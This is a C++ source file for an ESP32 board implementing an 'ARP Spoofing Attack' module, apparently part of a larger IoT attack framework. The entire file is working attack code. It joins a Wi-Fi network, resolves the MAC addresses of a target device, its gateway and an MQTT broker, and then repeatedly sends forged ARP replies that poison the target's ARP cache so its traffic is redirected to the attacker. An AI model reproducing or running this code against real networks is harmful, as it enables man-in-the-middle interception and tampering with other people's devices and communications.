/*
 * ArpSpoofAttack.cpp
 * 
 * Implementation of the ARP Spoofing Attack module
 */

#include "ArpSpoofAttack.h"

ArpSpoofAttack::ArpSpoofAttack() : Attack(ATTACK_TYPE_ARP_SPOOF, "ARP Spoofing") {
  // Initialize parameters with defaults
  ssid = "";
  password = "";
  
  targetDeviceIp = "192.168.1.101";
  gatewayIp = "192.168.1.1";
  mqttBrokerIp = "192.168.1.100";
  
  attackMode = ARP_ATTACK_MODE_GATEWAY;
  attackInterval = DEFAULT_ARP_SPOOF_INTERVAL;
  
  memset(targetDeviceMac, 0, 6);
  memset(gatewayMac, 0, 6);
  memset(mqttBrokerMac, 0, 6);
  memset(myMac, 0, 6);
  
  targetFound = false;
  gatewayFound = false;
  brokerFound = false;
}

ArpSpoofAttack::~ArpSpoofAttack() {
  // Clean up
  stop();
}

bool ArpSpoofAttack::start(unsigned long duration) {
  // Don't start if already running
  if (status == ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Reset error message
  errorMessage = "";
  
  // Check if we have WiFi credentials
  if (ssid.length() == 0 || password.length() == 0) {
    errorMessage = "WiFi credentials not set";
    status = ATTACK_STATUS_ERROR;
    return false;
  }
  
  // Connect to WiFi
  setupWiFi();
  
  // Get our own MAC address
  esp_read_mac(myMac, ESP_MAC_WIFI_STA);
  Serial.print("My MAC address: ");
  printMacAddress(myMac);
  
  // Scan network to find targets
  scanNetwork();
  
  // Check if we found the target device
  if (!targetFound) {
    errorMessage = "Target device not found";
    status = ATTACK_STATUS_ERROR;
    return false;
  }
  
  // Check if we found the gateway (if needed)
  if ((attackMode == ARP_ATTACK_MODE_GATEWAY || attackMode == ARP_ATTACK_MODE_BOTH) && !gatewayFound) {
    errorMessage = "Gateway not found";
    status = ATTACK_STATUS_ERROR;
    return false;
  }
  
  // Check if we found the MQTT broker (if needed)
  if ((attackMode == ARP_ATTACK_MODE_BROKER || attackMode == ARP_ATTACK_MODE_BOTH) && !brokerFound) {
    errorMessage = "MQTT broker not found";
    status = ATTACK_STATUS_ERROR;
    return false;
  }
  
  Serial.println("ARP Spoofing Attack started");
  Serial.print("Target device: ");
  Serial.print(targetDeviceIp);
  Serial.print(" (");
  printMacAddress(targetDeviceMac);
  Serial.println(")");
  
  if (attackMode == ARP_ATTACK_MODE_GATEWAY || attackMode == ARP_ATTACK_MODE_BOTH) {
    Serial.print("Spoofing gateway: ");
    Serial.print(gatewayIp);
    Serial.print(" (");
    printMacAddress(gatewayMac);
    Serial.println(")");
  }
  
  if (attackMode == ARP_ATTACK_MODE_BROKER || attackMode == ARP_ATTACK_MODE_BOTH) {
    Serial.print("Spoofing MQTT broker: ");
    Serial.print(mqttBrokerIp);
    Serial.print(" (");
    printMacAddress(mqttBrokerMac);
    Serial.println(")");
  }
  
  // Set start time and duration
  startTime = millis();
  this->duration = duration;
  lastActionTime = 0;
  
  // Update status
  status = ATTACK_STATUS_RUNNING;
  
  return true;
}

bool ArpSpoofAttack::stop() {
  // Only stop if running
  if (status != ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Disconnect from WiFi
  WiFi.disconnect();
  
  Serial.println("ARP Spoofing Attack stopped");
  
  // Update status
  status = ATTACK_STATUS_STOPPING;
  
  return true;
}

void ArpSpoofAttack::update() {
  // Call base class update
  Attack::update();
  
  // Only perform actions if running
  if (status == ATTACK_STATUS_RUNNING) {
    // Check WiFi connection
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("WiFi disconnected. Reconnecting...");
      setupWiFi();
      return;
    }
    
    unsigned long currentMillis = millis();
    
    // Send ARP spoofing packets at regular intervals
    if (currentMillis - lastActionTime >= attackInterval) {
      lastActionTime = currentMillis;
      
      if (!targetFound) {
        // Try to find target again
        targetFound = getMacFromIp(targetDeviceIp, targetDeviceMac);
        if (!targetFound) {
          Serial.println("Target device still not found");
          return;
        }
      }
      
      // Perform ARP spoofing based on attack mode
      if (attackMode == ARP_ATTACK_MODE_GATEWAY || attackMode == ARP_ATTACK_MODE_BOTH) {
        // Spoof gateway to target device
        if (gatewayFound) {
          sendFakeArp(targetDeviceMac, gatewayIp);
        } else {
          gatewayFound = getMacFromIp(gatewayIp, gatewayMac);
        }
      }
      
      if (attackMode == ARP_ATTACK_MODE_BROKER || attackMode == ARP_ATTACK_MODE_BOTH) {
        // Spoof MQTT broker to target device
        if (brokerFound) {
          sendFakeArp(targetDeviceMac, mqttBrokerIp);
        } else {
          brokerFound = getMacFromIp(mqttBrokerIp, mqttBrokerMac);
        }
      }
    }
  }
}

bool ArpSpoofAttack::setParameter(const String& name, const String& value) {
  if (name == "ssid") {
    ssid = value;
    return true;
  }
  else if (name == "password") {
    password = value;
    return true;
  }
  else if (name == "target") {
    targetDeviceIp = value;
    targetFound = false;
    return true;
  }
  else if (name == "gateway") {
    gatewayIp = value;
    gatewayFound = false;
    return true;
  }
  else if (name == "broker") {
    mqttBrokerIp = value;
    brokerFound = false;
    return true;
  }
  else if (name == "mode") {
    if (value == "gateway" || value == "1") {
      attackMode = ARP_ATTACK_MODE_GATEWAY;
      return true;
    }
    else if (value == "broker" || value == "2") {
      attackMode = ARP_ATTACK_MODE_BROKER;
      return true;
    }
    else if (value == "both" || value == "3") {
      attackMode = ARP_ATTACK_MODE_BOTH;
      return true;
    }
    else {
      errorMessage = "Invalid attack mode";
      return false;
    }
  }
  else if (name == "interval") {
    int interval = value.toInt();
    if (interval >= 1000) {
      attackInterval = interval;
      return true;
    } else {
      errorMessage = "Invalid interval (must be >= 1000ms)";
      return false;
    }
  }
  else if (name == "target_mac") {
    if (macAddressFromString(value, targetDeviceMac)) {
      targetFound = true;
      return true;
    } else {
      errorMessage = "Invalid MAC address format";
      return false;
    }
  }
  else if (name == "gateway_mac") {
    if (macAddressFromString(value, gatewayMac)) {
      gatewayFound = true;
      return true;
    } else {
      errorMessage = "Invalid MAC address format";
      return false;
    }
  }
  else if (name == "broker_mac") {
    if (macAddressFromString(value, mqttBrokerMac)) {
      brokerFound = true;
      return true;
    } else {
      errorMessage = "Invalid MAC address format";
      return false;
    }
  }
  
  errorMessage = "Unknown parameter: " + name;
  return false;
}

String ArpSpoofAttack::getParameter(const String& name) const {
  if (name == "ssid") {
    return ssid;
  }
  else if (name == "password") {
    return "********"; // Don't return actual password
  }
  else if (name == "target") {
    return targetDeviceIp;
  }
  else if (name == "gateway") {
    return gatewayIp;
  }
  else if (name == "broker") {
    return mqttBrokerIp;
  }
  else if (name == "mode") {
    switch (attackMode) {
      case ARP_ATTACK_MODE_GATEWAY:
        return "gateway";
      case ARP_ATTACK_MODE_BROKER:
        return "broker";
      case ARP_ATTACK_MODE_BOTH:
        return "both";
      default:
        return "unknown";
    }
  }
  else if (name == "interval") {
    return String(attackInterval);
  }
  else if (name == "target_mac") {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             targetDeviceMac[0], targetDeviceMac[1], targetDeviceMac[2],
             targetDeviceMac[3], targetDeviceMac[4], targetDeviceMac[5]);
    return String(macStr);
  }
  else if (name == "gateway_mac") {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             gatewayMac[0], gatewayMac[1], gatewayMac[2],
             gatewayMac[3], gatewayMac[4], gatewayMac[5]);
    return String(macStr);
  }
  else if (name == "broker_mac") {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             mqttBrokerMac[0], mqttBrokerMac[1], mqttBrokerMac[2],
             mqttBrokerMac[3], mqttBrokerMac[4], mqttBrokerMac[5]);
    return String(macStr);
  }
  
  return "";
}

String ArpSpoofAttack::getAllParameters() const {
  String params = "{";
  params += "\"ssid\":\"" + ssid + "\",";
  params += "\"password\":\"********\","; // Don't return actual password
  params += "\"target\":\"" + targetDeviceIp + "\",";
  params += "\"gateway\":\"" + gatewayIp + "\",";
  params += "\"broker\":\"" + mqttBrokerIp + "\",";
  
  switch (attackMode) {
    case ARP_ATTACK_MODE_GATEWAY:
      params += "\"mode\":\"gateway\",";
      break;
    case ARP_ATTACK_MODE_BROKER:
      params += "\"mode\":\"broker\",";
      break;
    case ARP_ATTACK_MODE_BOTH:
      params += "\"mode\":\"both\",";
      break;
    default:
      params += "\"mode\":\"unknown\",";
      break;
  }
  
  params += "\"interval\":" + String(attackInterval) + ",";
  
  char macStr[18];
  
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           targetDeviceMac[0], targetDeviceMac[1], targetDeviceMac[2],
           targetDeviceMac[3], targetDeviceMac[4], targetDeviceMac[5]);
  params += "\"target_mac\":\"" + String(macStr) + "\",";
  
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           gatewayMac[0], gatewayMac[1], gatewayMac[2],
           gatewayMac[3], gatewayMac[4], gatewayMac[5]);
  params += "\"gateway_mac\":\"" + String(macStr) + "\",";
  
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mqttBrokerMac[0], mqttBrokerMac[1], mqttBrokerMac[2],
           mqttBrokerMac[3], mqttBrokerMac[4], mqttBrokerMac[5]);
  params += "\"broker_mac\":\"" + String(macStr) + "\"";
  
  params += "}";
  
  return params;
}

void ArpSpoofAttack::setupWiFi() {
  Serial.println();
  Serial.print("Connecting to ");
  Serial.println(ssid);

  WiFi.begin(ssid.c_str(), password.c_str());

  // Wait for connection with timeout
  unsigned long startTime = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - startTime < 10000) {
    delay(500);
    Serial.print(".");
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("");
    Serial.println("WiFi connected");
    Serial.println("IP address: ");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("");
    Serial.println("WiFi connection failed");
  }
}

void ArpSpoofAttack::scanNetwork() {
  Serial.println("Scanning network for target devices...");
  
  // Try to get MAC addresses of targets
  targetFound = getMacFromIp(targetDeviceIp, targetDeviceMac);
  gatewayFound = getMacFromIp(gatewayIp, gatewayMac);
  brokerFound = getMacFromIp(mqttBrokerIp, mqttBrokerMac);
  
  if (targetFound) {
    Serial.print("Target device found at IP ");
    Serial.print(targetDeviceIp);
    Serial.print(", MAC: ");
    printMacAddress(targetDeviceMac);
  } else {
    Serial.println("Target device not found. Make sure it's connected to the network.");
  }
  
  if (gatewayFound) {
    Serial.print("Gateway found at IP ");
    Serial.print(gatewayIp);
    Serial.print(", MAC: ");
    printMacAddress(gatewayMac);
  } else {
    Serial.println("Gateway not found. Check the IP address.");
  }
  
  if (brokerFound) {
    Serial.print("MQTT broker found at IP ");
    Serial.print(mqttBrokerIp);
    Serial.print(", MAC: ");
    printMacAddress(mqttBrokerMac);
  } else {
    Serial.println("MQTT broker not found. Check the IP address.");
  }
}

bool ArpSpoofAttack::getMacFromIp(const String& ipStr, uint8_t* mac) {
  // Convert string IP to uint32_t
  ip4_addr_t ip;
  if (!ipAddressFromString(ipStr, &ip)) {
    Serial.println("Invalid IP address format");
    return false;
  }
  
  // Try to get MAC from ARP table
  struct eth_addr* eth_ret = NULL;
  ip4_addr_t* ip_ret = NULL;
  
  // Send ARP request
  etharp_request(netif_default, &ip);
  delay(100); // Wait for reply
  
  // Check ARP table
  if (etharp_find_addr(netif_default, &ip, &eth_ret, &ip_ret) == -1) {
    // Not found in ARP table
    Serial.print("MAC address for IP ");
    Serial.print(ipStr);
    Serial.println(" not found in ARP table");
    return false;
  }
  
  // Copy MAC address
  memcpy(mac, eth_ret->addr, 6);
  return true;
}

void ArpSpoofAttack::sendFakeArp(uint8_t* targetMac, const String& spoofIp) {
  // Convert string IP to uint32_t
  ip4_addr_t ip;
  if (!ipAddressFromString(spoofIp, &ip)) {
    Serial.println("Invalid IP address format");
    return;
  }
  
  // Create an ARP packet
  eth_hdr* eth_header = (eth_hdr*)malloc(sizeof(eth_hdr) + sizeof(etharp_hdr));
  if (eth_header == NULL) {
    Serial.println("Memory allocation failed");
    return;
  }
  
  etharp_hdr* arp_header = (etharp_hdr*)(((uint8_t*)eth_header) + sizeof(eth_hdr));
  
  // Set Ethernet header
  memcpy(eth_header->dest.addr, targetMac, 6);
  memcpy(eth_header->src.addr, myMac, 6);
  eth_header->type = PP_HTONS(ETHTYPE_ARP);
  
  // Set ARP header
  arp_header->hwtype = PP_HTONS(ARPHRD_ETHER);
  arp_header->proto = PP_HTONS(ETHTYPE_IP);
  arp_header->hwlen = ETHARP_HWADDR_LEN;
  arp_header->protolen = sizeof(ip4_addr_t);
  arp_header->opcode = PP_HTONS(ARP_REPLY);
  
  // Set sender hardware address (our MAC)
  memcpy(arp_header->shwaddr.addr, myMac, 6);
  // Set sender IP address (the IP we're spoofing)
  memcpy(arp_header->sipaddr.addrw, &ip, sizeof(ip4_addr_t));
  // Set target hardware address (target's MAC)
  memcpy(arp_header->dhwaddr.addr, targetMac, 6);
  // Set target IP address (target's IP)
  ip4_addr_t target_ip;
  ipAddressFromString(targetDeviceIp, &target_ip);
  memcpy(arp_header->dipaddr.addrw, &target_ip, sizeof(ip4_addr_t));
  
  // Send the packet
  esp_wifi_internal_tx(ESP_IF_WIFI_STA, eth_header, sizeof(eth_hdr) + sizeof(etharp_hdr));
  
  free(eth_header);
  
  Serial.print("Sent fake ARP reply to ");
  printMacAddress(targetMac);
  Serial.print(" claiming that ");
  Serial.print(spoofIp);
  Serial.println(" is at our MAC address");
}

void ArpSpoofAttack::printMacAddress(const uint8_t* mac) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  Serial.println(macStr);
}

bool ArpSpoofAttack::macAddressFromString(const String& macStr, uint8_t* mac) {
  // Check if the string is a valid MAC address
  if (macStr.length() != 17) {
    return false;
  }
  
  // Parse the MAC address
  int values[6];
  int result = sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
                     &values[0], &values[1], &values[2],
                     &values[3], &values[4], &values[5]);
  
  if (result != 6) {
    return false;
  }
  
  // Convert to bytes
  for (int i = 0; i < 6; i++) {
    mac[i] = (uint8_t)values[i];
  }
  
  return true;
}

bool ArpSpoofAttack::ipAddressFromString(const String& ipStr, ip4_addr_t* ip) {
  // Use the lwIP function to convert string to IP
  return ip4addr_aton(ipStr.c_str(), ip);
}
